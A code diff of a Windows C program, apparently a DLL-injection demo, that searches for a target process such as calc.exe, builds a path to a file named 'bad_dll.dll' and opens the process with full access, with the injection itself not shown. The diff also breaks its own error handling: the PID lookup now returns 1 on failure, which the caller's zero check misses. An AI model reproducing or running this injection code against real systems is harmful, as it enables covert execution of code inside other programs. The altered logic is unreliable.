@@ -2,10 +2,8 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 
-#include "get_dir.h"
+#include "get_relative_path.h"
 #include "attack.h"
-
-#define MAX_PATH 260
 
 
 DWORD get_pid_from_list(const char *names[], size_t count)
@@ -15,7 +13,7 @@ DWORD get_pid_from_list(const char *names[], size_t count)
 
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE)
-        return 0;
+        return 1;
 
     if (Process32First(snapshot, &pe)) {
         do {
@@ -29,7 +27,7 @@ DWORD get_pid_from_list(const char *names[], size_t count)
     }
 
     CloseHandle(snapshot);
-    return 0; // No process found
+    return 1; // No process found
 }
 
 int main(void) {
@@ -39,17 +37,15 @@ int main(void) {
         "calc.exe",
     };
 
-    // Get dll path and pid
-    char exe_dir[MAX_PATH];
-    get_dir(exe_dir, sizeof(exe_dir));
-
     char dll[MAX_PATH];
-    snprintf(dll, sizeof(dll), "%s\\%s", exe_dir, "bad_dll.dll");
+    if (get_relative_path(dll, sizeof(dll), "bad_dll.dll") != 0) {
+        return 1;
+    }
 
     DWORD pid = get_pid_from_list(processes, sizeof(processes) / sizeof(processes[0]));
 
     if (!pid)
-        return 0;
+        return 1;
 
     // Get process handle
     HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
